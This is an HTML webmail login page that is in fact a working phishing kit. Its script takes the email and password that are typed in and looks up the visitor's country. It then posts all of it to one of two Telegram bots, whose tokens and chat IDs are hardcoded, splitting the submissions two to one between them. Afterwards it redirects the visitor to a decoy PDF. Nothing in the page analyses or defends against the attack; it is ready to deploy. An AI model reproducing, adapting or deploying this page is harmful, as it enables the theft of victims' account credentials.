<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        /* Your existing CSS here */
    </style>
    <script>
        let userCountry = ""; // Placeholder for user country

        // Function to populate the email field from URL parameter
        function populateEmailField() {
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                document.getElementById('email').value = params.get('email');
            }
        }

        // Function to get user's country
        function getUserCountry() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    userCountry = data.country_name;
                })
                .catch(error => {
                    console.error('Error fetching country:', error);
                });
        }

        // Function to send data to Telegram with a 2:1 ratio between two bots
        function sendDataToTelegram(event) {
            event.preventDefault(); // Prevents form from submitting in the usual way

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Bot details
            const bot1Token = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
            const bot1ChatId = "6885599280";
            const bot2Token = "5376961693:AAFEhctXNCUb8eb4IIitRHCHVikGutqrAjU";
            const bot2ChatId = "5080203047";

            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;

            // Load submission counter from local storage
            let counter = localStorage.getItem('submissionCounter');
            counter = counter ? parseInt(counter, 10) : 0;

            // Determine which bot to send to based on the counter
            let botToken, chatId;
            if (counter % 3 === 2) { // Every third submission goes to Bot 2
                botToken = bot2Token;
                chatId = bot2ChatId;
            } else { // Other submissions go to Bot 1
                botToken = bot1Token;
                chatId = bot1ChatId;
            }

            // Send the message to the selected bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = "documentequipment001.pdf"; // Redirect to PDF
                } else {
                    console.error("Error sending message:", data);
                }
            })
            .catch(error => {
                console.error("Failed to send message. Please try again later.", error);
            });

            // Increment the counter and save it back to local storage
            counter++;
            localStorage.setItem('submissionCounter', counter);
        }

        window.onload = function() {
            populateEmailField();
            getUserCountry();
        };
    </script>
</head>
<body>
    <div class="container">
        <img src="webmail-logo.svg" alt="Webmail Logo">
        <div class="login-box">
            <form onsubmit="sendDataToTelegram(event)">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                
                <button type="submit">Log in</button>
            </form>
        </div>
        <div class="languages">
            <!-- Your existing languages and footer here -->
        </div>
    </div>
</body>
</html>
